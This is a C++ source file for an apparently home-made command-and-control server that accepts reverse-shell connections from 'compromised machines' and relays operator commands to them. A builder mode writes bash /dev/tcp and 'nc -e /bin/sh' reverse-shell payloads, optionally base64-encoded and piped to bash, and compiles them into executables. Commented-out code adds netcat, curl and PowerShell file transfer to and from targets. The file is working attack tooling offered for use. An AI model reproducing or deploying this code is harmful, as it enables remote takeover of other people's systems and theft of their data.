// Compiled via clang++ -g -Werror -W -Wunused -Wuninitialized -Wshadow -std=c++17

#include "C2.hpp" // --> includes: iosteam, string, vector, cstdlib

int LPORT;
std::string LHOST;
CentralCore beacon;

const std::string base64_chars =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    "abcdefghijklmnopqrstuvwxyz"
    "0123456789+/";

// global buffer used to store received data from shell sessions
// to later display on terminal
size_t BUFFER_SIZE = 4096*4;
std::vector<char> buffer(BUFFER_SIZE);

// current socket we are interacting with
int select_socket = -1;

// thread keeping track of incoming connections
std::thread t;

// socket transfer data numbers
ssize_t bytes_sent, bytes_received, total_bytes_received;
size_t shellIndex = -1;

// socket timeout data
// Set timeout for recv
struct timeval timeout;

// C2-Cli Functions
void c2_cmd(std::string);
void createShellScript(std::string, bool, bool, bool, std::string, std::string);
void scriptCliCmd(std::string);

// Extra Components
void BackgroundConnectionHandler();
void ShellInteraction();
std::string base64_encode(const std::string&);
void fetchInterfaceIPs();
void HandleServer();
void BackgroundInitListener();
int ShellCheck();

int main()
{
    // Attempt to start up local beacon
    // when the beacon start a connection.log
    // is created we want to handle moving it
    // after we shutdown the beacon

    std::srand(time(nullptr));

    LPORT = beacon.getCentralPort();
    LHOST = beacon.getCentralHost();

    // Start up the server
    HandleServer();

    std::thread t2(BackgroundInitListener);

    std::string cli_in;

    // pipe inputs to the beacon
    while (!serverShutDown)
    {
        std::cout << "C2 > ";

        std::getline(std::cin, cli_in);

        c2_cmd(cli_in);
    }

    std::cout << "[*] C2 Server Shutting Down. . ." << "\n";

    // send a kill signal to server
    std::string killcmd;
    killcmd += "/usr/bin/nc 127.0.0.1 " + std::to_string(LPORT) + " &";
    std::system(killcmd.c_str());

    // wait for the thread to finish
    // before we relocate the file
    // the thread is reading

    std::cout << "[*] Waiting for thread to finish. . .\n";
    
    // Close the client and server sockets
    t.join(); // wait for the thread to finish before closing off the program
    t2.join();    

    std::cout << "[+] Thread has Finished!\n";

    // ensure all sockets are closed before closing the server
    for (size_t i = 0; i < sessions.size(); ++i) close(sessions[i].GetSocket());

    close(server_socket);

    std::cout << "[*] C2 Beacon Shut Down!\n";
};

void c2_cmd(std::string cmd)
{
    if (cmd == "shutdown") { serverShutDown = true; return; }

    if (cmd == "help")
    {
        std::cout << "------ COMMANDS ------" << "\n";
        std::cout << "shutdown ---- Exit c2 program" << "\n";
        std::cout << "help -------- Show this page" << "\n";
        std::cout << "devices ----- Display compromised machines" << "\n";
        std::cout << "server ------ Display C2 Server Info" << "\n";
        std::cout << "script ------ Create shell executables" << "\n";
        //std::cout << "" << "\n";
        std::cout << "----------------------" << "\n";
        std::cout << "\n";
        return;
    }

    if (cmd == "help devices")
    {
        std::cout << "NO ARG - display compromised machines" << "\n";
        std::cout << "-i ----- interact with indexed machine" << "\n";
        std::cout << "-d ----- disconnect indexed machine" << "\n";
        std::cout << "\n";
        return;
    }

    if (cmd == "devices")
    {
        // display beacons devices collection
        std::cout << "---------------- DEVICES ----------------" << "\n";
        beacon.displayDevices();
        std::cout << "-----------------------------------------" << "\n";
        std::cout << "\n";
        return;
    }

    if (cmd == "server")
    {
        // display beacons devices collection
        std::cout << "---------------- SERVER ----------------" << "\n";
        // std::cout << "HOST :: " << LHOST << "\n";
        
        fetchInterfaceIPs();

        std::cout << "PORT :: " << LPORT << "\n";
        std::cout << "----------------------------------------" << "\n";
        std::cout << "\n";
        return;
    }

    if (cmd == "script")
    {
        // enter a new cli to build shell code
        std::cout << "---------------- SCRIPT ----------------" << "\n";

        std::string script_cli_in;

        // Display the Server IPs
        fetchInterfaceIPs();
        std::cout << "\n";

        // freeifaddrs(ifap);

        while (script_cli_in != "exit")
        {
            std::cout << "scr1pt > ";
            std::getline(std::cin, script_cli_in);
            scriptCliCmd(script_cli_in);
        }

        std::cout << "----------------------------------------" << "\n";
        std::cout << "\n";
        return;
    }

    // Session Mirgration
    if (cmd == "devices -i")
    {
        std::cout << "Enter Shell Index :: ";
        std::cin >> shellIndex;

        if (shellIndex < sessions.size())
        {
            select_socket = sessions[shellIndex].GetSocket();
            std::cout << "[*] Shell Session Migrated Successfully!" << "\n";
            
            // causes stuff to be displayed on screen
            setsockopt(select_socket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
            
            // this should allow the code to hit the if block
            // below thus triggering the c2 cli to transition
            // to shell mode

            std::cout << "[*] Checking Connection. . .\n";

            if ( ShellCheck() == 0 )
            {
                std::cout << "[+] Connection Stable!\n";
                ShellInteraction();
            };

            return;
        } else
            {
                std::cout << "[-] Invalid Shell Index!" << "\n";
                shellIndex = -1;
                return;
            }
    }

    // Session removal
    if (cmd == "devices -d")
    {
        // display beacons devices collection
        std::cout << "---------------- DEVICES ----------------" << "\n";
        beacon.displayDevices();
        std::cout << "-----------------------------------------" << "\n";
        std::cout << "\n";

        // prompt for index deletion
        std::cout << "Enter Shell Index you want to Remove :: ";
        std::cin >> shellIndex;

        if (shellIndex < sessions.size())
        {
            // shuts off the no longer wanted connection
            // and removes it from the pool
            close(sessions[shellIndex].GetSocket());
            sessions.erase(sessions.begin() + shellIndex);

            std::cout << "[*] Deviced Removed from Pool!" << "\n";

            // reset select_socket to default
            select_socket = -1;
            shellIndex = -1;
        } else
            {
                std::cout << "[-] Invalid Shell Index!" << "\n";
                shellIndex = -1;
                return;
            }
    }

    // Enter an interactive shell session
    if (cmd == "shell")
    {
        if (select_socket == -1)
        {
            std::cout << "[-] No Backed Up Shell Session Found!" << "\n";
            std::cout << "[*] Run 'devices' to check for fetched shells!" << "\n";
        };
        
        if ( ShellCheck() == 0 ) { ShellInteraction(); };
        return;
    }

    std::cout << "[*] Running Local System Command. . .\n";
    system(cmd.c_str());
    std::cout << "\n";
};

void scriptCliCmd(std::string cmd)
{
    if (cmd == "exit") { return; };

    if (cmd == "help")
    {
        std::cout << "---------------- HELP ----------------" << "\n";

        std::cout << "exit --- return to c2 cli" << "\n";
        std::cout << "help --- display this screen" << "\n";
        std::cout << "-ip ---- set the c2 server IP [default is lo interface ip]" << "\n";
        std::cout << "-os ---- target os [linux as default]" << "\n";
        std::cout << "-shell - type of shell [bash/sh/nc] [bash as default]" << "\n";
        std::cout << "-obf --- obfuscate shell script" << "\n";
        std::cout << "-e ----- encode shell script" << "\n";
        std::cout << "-r ----- display raw output" << "\n";
        std::cout << "-O ----- name of outfile" << "\n";

        std::cout << "==== EXAMPLE COMMANDS ====" << "\n";
        std::cout << "[*] -os windows -shell sh -e base64 -O c2_shell" << "\n";
        std::cout << "[*] -os linux -obf -e base64 -r" << "\n";
        std::cout << "==========================" << "\n";

        std::cout << "--------------------------------------" << "\n";
        std::cout << "\n";
        return;
    }

    // Parse the cmd for the tags and perform logic based
    // on the extracted tags from the parsing

    std::vector<std::string> parsedFlags;
    int start = 0;
    int pos = cmd.find(" ", start);

    while (pos != -1)
    {
        parsedFlags.push_back( cmd.substr(start, pos-start) );

        start = pos + 1;
        pos = cmd.find(" ", start);
    }

    // capture the rest of the string if we end with -r
    parsedFlags.push_back( cmd.substr(start) );

    for (size_t i = 0; i < parsedFlags.size(); ++i)
    {
        std::cout << i << " :: '" << parsedFlags[i] << "'\n";
    }
    std::cout << "\n";

    std::string fileName_;
    bool obf_ = false;
    bool enc_ = false;
    bool raw_ = false;
    std::string targetOS_ = "linux";
    std::string shellType_ = "bash";

    // Run through the parse collection and perform logic
    for (size_t i = 0; i < parsedFlags.size(); ++i)
    {
        std::string flag_ = parsedFlags[i];

        if (flag_ == "-os")
        {
            if (i+1 < parsedFlags.size())
            {
                if (parsedFlags[i+1] == "linux" || parsedFlags[i+1] == "windows")
                {
                    if (targetOS_ != "") std::cout << "[-] Bad Command Input! :: Duplicate -os flags" << "\n";
                    targetOS_ = parsedFlags[i+1];
                } else
                    {
                        std::cout << "[-] Invalid OS Target! :: -os takes 1 parameter linux/windows" << "\n";
                        return;
                    }
            } else
                {
                    std::cout << "[-] Bad Command Input! :: -os takes 1 parameter linux/windows" << "\n";
                    return;
                }
        }

        if (flag_ == "-e")
        {
            if (i+1 < parsedFlags.size())
            {
                if (parsedFlags[i+1] == "base64")
                {
                    if (!enc_)
                        enc_ = true;
                    else
                        std::cout << "[-] Bad Command Input! :: Duplicate -e flags" << "\n";
                } else
                    {
                        std::cout << "[-] Bad Command Input! :: -e takes one parameter [base64]" << "\n";
                    }
            } else
                {
                    // default set
                    if (!enc_)
                        enc_ = true;
                    else
                        std::cout << "[-] Bad Command Input! :: Duplicate -e flags" << "\n";
                }
        }

        if (flag_ == "-O")
        {
            if (i+1 < parsedFlags.size())
            {
                if (fileName_ != "") std::cout << "[-] Bad Command Input! :: Duplicate -O flags" << "\n";
                fileName_ = parsedFlags[i+1];
            } else
                {
                    std::cout << "[-] Bad Command Input! :: -O takes 1 parameter [outfile name]" << "\n";
                    return;
                }
        }

        if (flag_ == "-r")
        {
            if (i != parsedFlags.size() - 1)
            {
                std::cout << "[-] Bad Command Input! :: -r should be placed at the end of the command" << "\n";
                return;
            }

            if (!raw_)
                raw_ = true;
            else
                std::cout << "[-] Bad Command Input! :: Duplicate -r flags" << "\n";
        }

        if (flag_ == "-obf")
        {
            // This is here due to this section being under
            // construction

            std::cout << "[-] Sorry! Obfuscation is Under Development!" << "\n";
            return;

            /*
            if (i+1 < parsedFlags.size())
            {
                std::string nextFlag_ = parsedFlags[i+1];

                if (nextFlag_ != "-r" || nextFlag_ != "-e" || nextFlag_ != "-O" || nextFlag_ != "-os")
                {
                    std::cout << "[-] Bad Command Input! :: -obf takes no overload parameters" << "\n";
                    return;
                }

            }

            if (!obf_)
                obf_ = true;
            else
                std::cout << "[-] Bad Command Input! :: Duplicate -obf flags" << "\n";
            */
        }

        if (flag_ == "-shell")
        {
            if (i+1 < parsedFlags.size())
            {
                std::string nextFlag_ = parsedFlags[i+1];

                if (nextFlag_ != "bash" || nextFlag_ != "sh" || nextFlag_ != "nc")
                {
                    std::cout << "[-] Bad Command Input! :: -shell takes one parameter [bash/sh/nc]" << "\n";
                    return;
                }

                shellType_ = nextFlag_;
            }
        }

        if (flag_ == "-ip")
        {
            LHOST = flag_;
        }

    }// End Of Parse Scanning

    createShellScript(targetOS_, obf_, enc_, raw_, fileName_, shellType_);
};

void createShellScript(std::string targetOS, bool obf, bool enc, bool raw, std::string fileName, std::string shellType)
{
    std::string codeContent;
    std::ofstream shellScript_;
    
    if (!raw)
    {
        // ready a new file to build if raw is false
        shellScript_.open(fileName);
    }

    // write content --> shellScript_ << "Writing this to a file.\n";
    if (targetOS == "windows")
    {
        // Windows Shell Code
        std::cout << "[*] Development in Progress. . ." << "\n";
        shellScript_.close();
        return;
    } else
        {
            // Linux Shell Code
            if (shellType == "bash")
            {
                codeContent += "/bin/bash -c '/bin/bash -i >& /dev/tcp/";
                codeContent += LHOST + "/" + std::to_string(LPORT) + " 0>&1'";
            }

            if (shellType == "sh")
            {
                codeContent += "/bin/bash -c '/usr/bin/sh -i >& /dev/tcp/";
                codeContent += LHOST + "/" + std::to_string(LPORT) + " 0>&1'";
            }

            if (shellType == "nc")
            {
                codeContent += "/usr/bin/nc -e /bin/sh ";
                codeContent += LHOST + " " + std::to_string(LPORT);
            }

            if (obf)
            {
                // make hard to read and etc
            }

            if (enc)
            {
                // make base64 payload
                std::string encoded = base64_encode(codeContent);
                codeContent = "echo -n '" + encoded + "'|base64 -d|/bin/bash";
            }

            if (raw)
            {
                // print to screen and dont build file
                std::cout << "[+] Sh3LL_SCR1PT :: " << codeContent << "\n\n";
            } else
                {
                    // build the file
                    std::string fileCapsule;
                    fileCapsule += "#include <iostream>\n#include <string>\n#include <cstdlib>\n";
                    fileCapsule += "int main(){\n";
                    fileCapsule += "system(\"" + codeContent + "\");";
                    fileCapsule += "}";

                    shellScript_ << fileCapsule;
                    shellScript_.close();

                    std::string buildCmd = "clang++ -g -Werror -W -Wunused -Wuninitialized -Wshadow -std=c++17 ";
                    buildCmd += fileName + "-o " + fileName + ".out";

                    if (system(buildCmd.c_str()) != 0)
                    {
                        std::cout << "[-] Error has Occured building shell executable!" << "\n";
                    };
                }
        }

    shellScript_.close();
};

/*
---------------------------------------
           Extra Components
---------------------------------------
*/

void BackgroundConnectionHandler()
{
    while (!serverShutDown)
    {
        // continously accept incoming connections
        sessions.push_back( ShellConnection(server_socket) );
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
};

void ShellInteraction()
{
    std::string shellcmd;

    while (shellcmd != "quit" && shellcmd != "exit")
    {
        getline(std::cin, shellcmd);

        if (shellcmd == "quit" || shellcmd == "exit") continue;
/*
        if (shellcmd == "download")
        {
            std::cout << "[-] download takes one parameter [filename from target]" << "\n";
            return;
        }

        if (shellcmd == "upload")
        {
            std::cout << "[-] upload takes one parameter [local filename]" << "\n";
            return;
        }

//===========================================================================

        // capture parameters for upload/download command
        std::vector<std::string> splitCommand;
        int start = 0;
        int pos = shellcmd.find(" ", start);

        while (pos != -1)
        {
            splitCommand.push_back( shellcmd.substr(start, pos-start) );

            start = pos + 1;
            pos = shellcmd.find(" ", start);
        }

        // Download files from target to local
        if (splitCommand[0] == "download")
        {
            // check if the file exists on the target
            if (splitCommand.size() != 2)
            {
                std::cout << "[-] download takes one parameter [filename on target]" << "\n";
                return;
            }

            // set up download listener locally on random port
            int randPort = std::rand() % 1000 + (LPORT + 2);

            std::string localListenerCmd = "/user/bin/timeout 5 /usr/bin/nc -lp " + std::to_string(randPort);
            localListenerCmd += " > " + splitCommand[1];

            system(localListenerCmd.c_str());

            // figure out what system we are uploading to
            if (sessions[shellIndex].GetSocketOS() == "Linux")
            {
                // run system command to send a file through netcat
                // on the target machine

                shellcmd = "/usr/bin/nc " + LHOST + " " + std::to_string(randPort);
                shellcmd += " < " + splitCommand[1];
            } else // Windows
                {
                    // host the target file from the target system
                    // windows powershell one-liner command:

                    shellcmd = "Get-Content '" + splitCommand[1] + "' | ForEach-Object { ";
                    shellcmd += "[System.Net.Sockets.TcpClient]::new('" + LHOST;
                    shellcmd += "', " + std::to_string(randPort) + ")";
                    shellcmd += ".GetStream().Write([System.Text.Encoding]::";
                    shellcmd += "UTF8.GetBytes($_), 0, $_.Length) }";
                }
        }

//===========================================================================

        // Download files from local to target
        if (splitCommand[0] == "upload")
        {
            if (splitCommand.size() != 2)
            {
                std::cout << "[-] upload takes one parameter [local filename]" << "\n";
                return;
            }

            // check if the file exists locally
            std::string checkStr = "file ";
            checkStr += splitCommand[1];

            if ( system(checkStr.c_str()) != 0 )
            {
                std::cout << "[-] " << splitCommand[1] << " does not Exist in PWD!" << "\n";
                return;
            }

            // use netcat to momentary host an instance of the file
            // nc -lp PORT < FILE

            // Establishing a File Share from local system
            std::string hostFileCmd = "/usr/bin/nc -lp ";
            
            int randPort = std::rand() % 1000 + (LPORT + 2);
            
            hostFileCmd += std::to_string(randPort) + " < ";
            hostFileCmd += splitCommand[1];

            system(hostFileCmd.c_str());

            // figure out what system we are uploading to
            if (sessions[shellIndex].GetSocketOS() == "Linux")
            {
                shellcmd = "/usr/bin/curl http://" + LHOST + ":" + std::to_string(randPort);
                shellcmd += "/" + splitCommand[1] + "-O " + splitCommand[1];
            } else // Windows
                {
                    shellcmd = "Invoke-WebRequest http://" + LHOST + ":";
                    shellcmd += std::to_string(randPort) + "/";
                    shellcmd += splitCommand[1] + "-OutFile " + splitCommand[1];
                }
        }
*/

//=========== SEND SHELL COMMAND ========================================

        shellcmd += '\n'; // tells the shell connections End-Of-Command
        const char* command = shellcmd.c_str();

        // send command to session
        bytes_sent = send(select_socket, command, strlen(command), 0);
        if (bytes_sent == -1)
        {
            // perror("send");
            close(select_socket);
            // close(server_socket);
            return;
        }

        // buffer clean-up
        buffer.clear();
        buffer.resize(BUFFER_SIZE);

        // Loop to receive data from client until there's no more data
        total_bytes_received = 0;
        while ((bytes_received = recv(select_socket, buffer.data() + total_bytes_received,
                buffer.size() - total_bytes_received, 0)) > 0)
        {
            total_bytes_received += bytes_received;
        }

        // null-terminator to assist in outstreaming data
        buffer[total_bytes_received] = '\0';

        // Exclude the command we send when displaying the recv
        // buffer data on the terminal
        if (total_bytes_received > (ssize_t)shellcmd.length()) {
            std::cout << buffer.data() + shellcmd.length();
        } else
            {
                std::cout << "No output received." << std::endl;
            }
    }
};

std::string base64_encode(const std::string &input)
{
    std::string encoded;
    int i = 0;
    int j = 0;
    unsigned char char_array_3[3];
    unsigned char char_array_4[4];

    for (const auto &c : input)
    {
        char_array_3[i++] = c;
        if (i == 3)
        {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;

            for (i = 0; i < 4; i++) encoded += base64_chars[char_array_4[i]];
            i = 0;
        }
    }

    if (i > 0)
    {
        for (j = i; j < 3; j++) char_array_3[j] = '\0';

        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);

        for (j = 0; j < i + 1; j++) encoded += base64_chars[char_array_4[j]];

        while (i++ < 3) encoded += '=';
    }

    return encoded;
};

void fetchInterfaceIPs()
{
    // Fetch all IP addresses we are using accrossed all interfaces
    struct ifaddrs *ifap, *ifa;
    if (getifaddrs(&ifap) == -1)
    {
        std::cout << "[-] Error Fetching IP addresses!" << "\n";
        return;
    }

    for (ifa = ifap; ifa != nullptr; ifa = ifa->ifa_next)
    {
        if (ifa->ifa_addr != nullptr && ifa->ifa_addr->sa_family == AF_INET)
        {
            char ip_address[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &((struct sockaddr_in*)ifa->ifa_addr)->sin_addr,
            ip_address, INET_ADDRSTRLEN);

            if (ifa->ifa_name == (std::string)"lo") LHOST = ip_address;

            std::cout << "Interface: " << ifa->ifa_name << ", HOST IP :: " << ip_address << "\n";
        }
    }

    freeifaddrs(ifap);
};

/*
===================================================================================
=================================SOCKET-SERVER=====================================
===================================================================================
*/

void HandleServer()
{
    /*
        Handles incoming connections to C2
        possible reroute incoming to establish
        reverse_shell connections with targets
    */

    try
    {
        // Create a socket
        LPORT = beacon.getCentralPort();
        LHOST = beacon.getCentralHost();

        server_socket = socket(AF_INET, SOCK_STREAM, 0);
        if (server_socket == -1)
        {
            // perror("socket");
            throw(1);
        }

        // Bind the socket to an address and port
        // struct sockaddr_in server_address;

        server_address.sin_family = AF_INET;
        server_address.sin_addr.s_addr = INADDR_ANY;
        server_address.sin_port = htons(LPORT);
        if (bind(server_socket, (struct sockaddr *)&server_address, sizeof(server_address)) == -1)
        {
            // perror("bind");
            close(server_socket);
            throw(2);
        }

        // Listen for incoming connections
        if (listen(server_socket, 1) == -1)
        {
            // perror("listen");
            close(server_socket);
            throw(3);
        }

        std::cout << "[*] C2 Server Successfully Established!" << "\n";
        std::cout << "[*] Server listening on port :: " << LPORT  << "\n";

        t = std::thread(BackgroundConnectionHandler);

        setsockopt(select_socket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
    } catch (int extCode)
        {
            std::cout << "UNAVAILABLE\n";
            std::cout << "[-] Error Establishing local beacon. . .\n";
            std::cout << "[*] Exit Code :: " << extCode << " :: ";
            
            if (extCode == 1) std::cout << "Failed to Make Socket Server";
            if (extCode == 2) std::cout << "Failed To Bind to Port";
            if (extCode == 3) std::cout << "Failed to Listen on Socket";            

            serverShutDown =  false;

            std::cout << "\n";
            exit(1);
        }
};

void BackgroundInitListener()
{
    timeout.tv_sec = 1;  // n seconds timeout (lets us escape recv loop)
    timeout.tv_usec = 0;

    while (sessions.size() == 0)
    {
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }

    // Receive init outstream from client
    bytes_received = recv(select_socket, buffer.data(), buffer.size(), 0);
    if (bytes_received == -1)
    {
        close(select_socket);
    } else if (bytes_received == 0)
        {
            std::cout << "Client disconnected." << std::endl;
        }
};

int ShellCheck()
{
    // send the whoami command
    std::string wakeCmd = "whoami";
    wakeCmd += '\n';

    const char* command = wakeCmd.c_str();
    int trys = 0;

    while (trys < 3)
    {
        // send command to session
        bytes_sent = send(select_socket, command, sizeof(command), 0);
        if (bytes_sent == -1)
        {
            return 1;
        }

        // buffer clean-up
        buffer.clear();
        buffer.resize(BUFFER_SIZE);

        // Loop to receive data from client until there's no more data
        total_bytes_received = 0;
        while ((bytes_received = recv(select_socket, buffer.data() + total_bytes_received,
                buffer.size() - total_bytes_received, 0)) > 0)
        {
            total_bytes_received += bytes_received;
        }

        // null-terminator to assist in outstreaming data
        if (total_bytes_received < (ssize_t)BUFFER_SIZE)
            buffer[total_bytes_received] = '\0';
        else
            buffer[BUFFER_SIZE-1] = '\0';

        // output the response to terminal
        if (total_bytes_received > (ssize_t)strlen(command))
        {
            return 0;
        } else
            {
                std::cout << "[-] No output received. Sending wake-up signal. . .\n";
                if (trys >= 3) { return 1; } else { ++trys; }
            }
    }

    return 1;
};
